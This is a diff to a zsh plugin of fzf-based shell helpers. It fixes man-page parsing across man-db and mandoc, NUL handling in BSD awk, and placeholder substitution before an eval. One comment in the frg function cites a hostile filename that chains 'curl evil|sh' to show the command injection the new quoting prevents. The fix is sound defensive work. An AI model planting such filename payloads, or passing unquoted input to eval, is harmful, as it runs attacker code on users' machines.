@@ -1,4 +1,7 @@
 
+# oh-my-zsh does not source $ZSH_CUSTOM/lib; nor does a zshrc seeded before it.
+[[ -n ${_MO_PLATFORM_LOADED-} ]] || source "${0:h}/../../lib/platform.zsh"
+
 source "${0:h}/requirements.zsh" || return
 
 # -- fzf environment ------------------------------------------------------------
@@ -98,6 +101,17 @@ fhist() {
 	[[ -n "$cmd" ]] && print -z -- "$cmd"
 }
 
+# Shared by fman and its fzf preview, and reachable from the test suite.
+typeset -g _MO_FMAN_PARSE='
+	{
+		if (!match($0, /[A-Za-z0-9_.:@+\[\]-]+[ ]?\([0-9a-zA-Z]+\)/)) next
+		tok = substr($0, RSTART, RLENGTH)
+		p = index(tok, "(")
+		name = substr(tok, 1, p - 1); sub(/[ ,]+$/, "", name)
+		sec  = substr(tok, p + 1);    sub(/\)$/, "", sec)
+		print sec, name
+	}'
+
 fman() {
 	if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
 		echo "Usage: fman"
@@ -106,18 +120,19 @@ fman() {
 	fi
 	command -v fzf &>/dev/null || { echo "fman: fzf not installed" >&2; return 1; }
 	local page
-	# man -k prints "name (sec) - desc" — or "a, b (sec) - desc" for grouped
-	# aliases, so the (sec) field is found by scanning, not assumed at $2.
-	page=$(man -k '' 2>/dev/null \
+	# `man -k ''` matches everything under man-db but nothing under mandoc,
+	# which macOS uses — the keyword is a regex there, so the picker came up
+	# empty. `.` means "any character" to both and matches every page.
+	#
+	# The two also print different shapes: man-db separates the section
+	# ("ls (1)  - list"), mandoc glues it on ("ls(1) - list"), and either may
+	# group aliases ("a, b(1) - ..."). One regex covers both by matching the
+	# first name-plus-section token wherever the parenthesis falls.
+	local parse="$_MO_FMAN_PARSE"
+	page=$(man -k . 2>/dev/null \
 		| fzf --height=50% --reverse \
-			  --preview 'man $(echo {2} | tr -d "()") $(echo {1} | tr -d ",") 2>/dev/null || man $(echo {1} | tr -d ",")' \
-		| awk '{
-			sec = ""
-			for (i = 2; i <= NF; i++) if ($i ~ /^\([0-9a-zA-Z]+\)$/) { sec = $i; break }
-			gsub(/[()]/, "", sec)
-			name = $1; sub(/,$/, "", name)
-			if (sec != "") print sec, name; else print name
-		}')
+			  --preview "echo {} | awk '${parse}' | xargs -r man 2>/dev/null || true" \
+		| awk "$parse")
 	[[ -n "$page" ]] || return 0
 	man ${=page}
 }
@@ -130,11 +145,17 @@ frg() {
 		return
 	fi
 	command -v fzf &>/dev/null || { echo "frg: fzf not installed" >&2; return 1; }
-	command -v rg  &>/dev/null || { echo "frg: rg not installed (try: sudo apt install ripgrep)" >&2; return 1; }
+	command -v rg  &>/dev/null || { echo "frg: rg not installed (try: $(_mo_pkg_hint ripgrep))" >&2; return 1; }
 	local dir="${1:-.}"
 	[[ -d "$dir" ]] || { echo "frg: not a directory: $dir" >&2; return 1; }
+	# tr the NUL to a tab before awk: BSD/BWK awk (macOS /usr/bin/awk) cannot
+	# use NUL as a field separator — it reads the record as one field, so the
+	# NF == 2 guard never fired and the picker stayed empty no matter what was
+	# typed. rg emits exactly one NUL per record, so the swap is lossless, and
+	# a literal tab in a filename is already rejected below. No-op on gawk.
 	local rg_cmd="[[ -z {q} ]] && true || rg --color=always --line-number --null -- {q} '$dir' 2>/dev/null \
-		| awk 'BEGIN { FS=\"\\0\" }
+		| tr '\\0' '\\t' \
+		| awk 'BEGIN { FS=\"\\t\" }
 		       NF == 2 {
 		           f = \$1; rest = \$2
 		           gsub(/\\033\\[[0-9;]*m/, \"\", f)
@@ -161,8 +182,21 @@ frg() {
 			# "hx {file}:{line}" for Helix). %f = file, %l = line number.
 			# Defaults: code → "code -g %f:%l", everything else → vim "+%l %f".
 			if [[ -n "${EDITOR_LINENO_FMT:-}" ]]; then
-				local open_cmd="${EDITOR_LINENO_FMT//%f/$file}"
-				open_cmd="${open_cmd//%l/$linenum}"
+				# Escape the %: zsh reads a leading % in a ${var//pat/repl}
+				# pattern as the end-of-string anchor, so %f never matched and
+				# %l matched only a trailing "l". Broken on Linux too — the
+				# README's own `hx %f:%l` example emitted `hx %f:%2`.
+				# ${(q)file}, not $file: this string is handed to eval, and
+				# the candidate filenames come from ripgrep over $dir — a
+				# cloned repo or an extracted archive supplies them. A file
+				# named `a;curl evil|sh;b` would otherwise run.
+				#
+				# Escaping %f/%l is what made this branch reachable at all:
+				# zsh reads a leading % in a ${var//pat/repl} pattern as the
+				# end-of-string anchor, so before that fix nothing substituted
+				# and the eval only ever saw the literal format string.
+				local open_cmd="${EDITOR_LINENO_FMT//\%f/${(q)file}}"
+				open_cmd="${open_cmd//\%l/${(q)linenum}}"
 				eval "$open_cmd"
 			elif [[ "${EDITOR:-}" == *code* ]]; then
 				code -g "${file}:${linenum}"
